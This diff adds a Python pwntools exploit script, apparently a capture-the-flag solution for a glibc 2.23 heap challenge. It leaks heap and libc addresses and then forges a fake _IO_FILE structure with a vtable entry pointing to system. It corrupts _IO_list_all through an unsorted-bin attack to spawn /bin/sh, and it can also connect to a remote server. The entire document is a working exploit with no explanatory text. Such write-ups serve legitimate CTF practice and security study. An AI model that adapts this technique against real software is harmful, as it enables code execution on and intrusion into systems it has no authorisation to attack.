@@ -1,0 +1,185 @@
+#!/usr/bin/env python
+#-*- coding:utf-8 -*-
+# Author: i0gan
+# Env: Linux arch 5.8.14-arch1-1
+
+from pwn import *
+import os
+
+r   =  lambda x : io.recv(x)
+ra  =  lambda   : io.recvall()
+rl  =  lambda   : io.recvline(keepends = True)
+ru  =  lambda x : io.recvuntil(x, drop = True)
+s   =  lambda x : io.send(x)
+sl  =  lambda x : io.sendline(x)
+sa  =  lambda x, y : io.sendafter(x, y)
+sla =  lambda x, y : io.sendlineafter(x, y)
+ia  =  lambda : io.interactive()
+c   =  lambda : io.close()
+li  = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')
+
+
+context.log_level='debug'
+context.terminal = ['tmux', 'splitw', '-h']
+
+elf_path  = 'pwn'
+MODIFY_LD = 0
+arch = '64'
+libc_v = '2.23'
+
+ld_path   = '/glibc/' + libc_v + '/' + arch + '/lib/ld-linux-x86-64.so.2'
+libs_path = '/glibc/' + libc_v + '/' + arch + '/lib'
+libc_path = '/glibc/' + libc_v + '/' + arch + '/lib/libc.so.6'
+#libc_path = './libc.so.6'
+
+# change ld path 
+if(MODIFY_LD):
+	os.system('cp ' + elf_path + ' ' + elf_path + '.bk')
+	change_ld_cmd = 'patchelf  --set-interpreter ' + ld_path +' ' + elf_path
+	os.system(change_ld_cmd)
+	li('modify ld ok!')
+	exit(0)
+
+# remote server ip and port
+server_ip = "0.0.0.0"
+server_port = 0
+
+# if local debug
+LOCAL = 1
+LIBC  = 1
+
+
+#--------------------------func-----------------------------
+def db():
+	if(LOCAL):
+		gdb.attach(io)
+
+def ad(n, sz, d):
+	sla(':', '1')	
+	sa(':', n)	
+	sla(':', str(sz))	
+	sa(':', d)
+
+def rm(i):
+	sla(':', '2')
+	sla(':', str(i))
+
+def dp(i):
+	sla(':', '3')
+	sla(':', str(i))
+
+#--------------------------exploit--------------------------
+def exploit():
+	li('exploit...')
+
+	ad('A\n', 0x40, 'A\n') # 0
+	ad('A\n' , 0, '\n') #1
+	ad('A\n', 0x40, 'A\n') # 2
+	ad('A\n', 0x30, 'A\n') # 3
+	ad('A\n', 0x40, 'A\n') # 4
+	ad('A\n', 0x20, 'A\n') # 5
+	ad('A\n', 0x20, 'A\n') # 6
+
+	# leak heap
+	rm(5)
+	rm(6)
+	ad('A\n', 0x20, '\n') # 5
+	dp(5)
+	ru('on:')
+	leak = u64(ru('\n')[-6:].ljust(8, b'\x00'))
+	heap = leak - 0x150
+	li('heap_base: ' + hex(heap))
+
+	# leak libc
+	rm(1)
+	ad('A\n', 0, p64(0) + p64(0) + p64(0) + p64(0x91) + b'\n') # 1
+	#db()
+	rm(2)
+	ad('A\n', 0x18, '\n') # 2
+
+	dp(2)
+	leak = u64(ru('\x7f')[-5:] + b'\x7f\x00\x00')
+	main_arena = 0x39bb20
+	libc_base = leak - main_arena - 216
+	unsorted_bin = libc_base + main_arena + 88
+	system = libc_base + libc.sym['system']
+
+	IO_list_all = libc_base + libc.sym['_IO_list_all']
+	li('libc_base: ' + hex(libc_base))
+
+	rm(2)
+	p = ''
+	p =  p64(0) * 2
+	p += b'/bin/sh\x00' + p64(0x61)
+	p += p64(0)
+	p += p64(IO_list_all - 0x10)
+
+	f = p64(0) # _IO_write_base 
+	f += p64(1) # _IO_write_ptr
+	f += p64(0) # _IO_write_end
+	f += p64(0) # _IO_buf_base
+	f += p64(0) # _IO_buf_end
+	f += p64(0) # _IO_save_base
+	f += p64(0) # _IO_backup_base
+	f += p64(0) # _IO_save_end
+	f += p64(0) # *_markers
+	f += p64(0) # *_chain
+	
+	f += p32(0) # _fileno
+	f += p32(0) # _flags2
+	
+	f += p64(1)  # _old_offset
+	
+	f += p16(2) # ushort _cur_colum;
+	f += p8(3)  # char _vtable_offset
+	f += p8(4)  # char _shrotbuf[1]
+	f += p32(0) # null for alignment
+	
+	f += p64(0) # _offset
+	f += p64(6) # _codecvt
+	f += p64(0) # _wide_data
+	f += p64(0) # _freeres_list
+	f += p64(0) # _freeres_buf
+	
+	f += p64(0) # __pad5
+	f += p32(0) # _mode
+	f += p32(0) # _unused2
+	#f = f.ljust(0xc0, '\x00')
+
+	p += f
+	p += p64(0) * 3 # alignment to vtable
+	p += p64(heap + 0x168) # vtable
+	p += p64(0) * 2
+	p += p64(system) # 
+	p += b'\n'
+	ad('A\n', 0, p) # 2
+
+	db()
+	p = 'A'
+	p += '\n'
+	ad('A\n', 0x10, p) # trigger
+
+	
+def finish():
+	ia()
+	c()
+
+#--------------------------main-----------------------------
+if __name__ == '__main__':
+	
+	if LOCAL:
+		elf = ELF(elf_path)
+		if LIBC:
+			libc = ELF(libc_path)
+			io = elf.process(env = {"LD_LIBRARY_PATH" : libs_path, "LD_PRELOAD" : libc_path} )
+		else:
+			io = elf.process(env = {"LD_LIBRARY_PATH" : libs_path} )
+	
+	else:
+		elf = ELF(elf_path)
+		io = remote(server_ip, server_port)
+		if LIBC:
+			libc = ELF(libc_path)
+
+	exploit()
+	finish()
